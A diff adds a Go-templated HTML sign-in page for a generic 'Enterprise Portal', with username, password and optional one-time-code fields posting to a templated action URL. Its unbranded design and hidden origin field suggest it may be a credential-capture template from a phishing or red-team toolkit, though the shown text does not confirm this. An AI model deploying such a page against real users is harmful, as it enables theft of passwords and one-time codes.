@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Portal Sign In</title>
+<style>
+  body { font-family: "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #eceff1; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
+  .card { background: #fff; width: 420px; padding: 40px; border-radius: 6px; box-shadow: 0 2px 12px rgba(0,0,0,.12); }
+  .logo { width: 64px; height: 64px; border-radius: 50%; background: #263238; color: #fff; font-size: 30px; line-height: 64px; text-align: center; margin-bottom: 16px; }
+  h1 { font-size: 20px; margin: 0 0 4px; color: #263238; }
+  .sub { color: #607d8b; font-size: 13px; margin-bottom: 24px; }
+  form { text-align: left; }
+  label { display: block; font-size: 13px; color: #546e7a; margin: 12px 0 4px; }
+  input { width: 100%; box-sizing: border-box; padding: 12px; border: 1px solid #cfd8dc; border-radius: 4px; font-size: 15px; }
+  button { width: 100%; margin-top: 20px; padding: 12px; border: 0; border-radius: 4px; background: #1565c0; color: #fff; font-size: 15px; font-weight: 600; cursor: pointer; }
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="logo">P</div>
+  <h1>Enterprise Portal</h1>
+  <p class="sub">Sign in with your corporate account</p>
+  <form method="post" action="{{.Action}}">
+    <input type="hidden" name="orig" value="{{.Orig}}">
+    <label>Username</label>
+    <input type="text" name="username" required autofocus>
+    <label>Password</label>
+    <input type="password" name="password" required>
+    {{if .ShowOTP}}<label>One-time code</label><input type="text" name="otp" inputmode="numeric">{{end}}
+    <button type="submit">Sign In</button>
+  </form>
+</div>
+</body>
+</html>
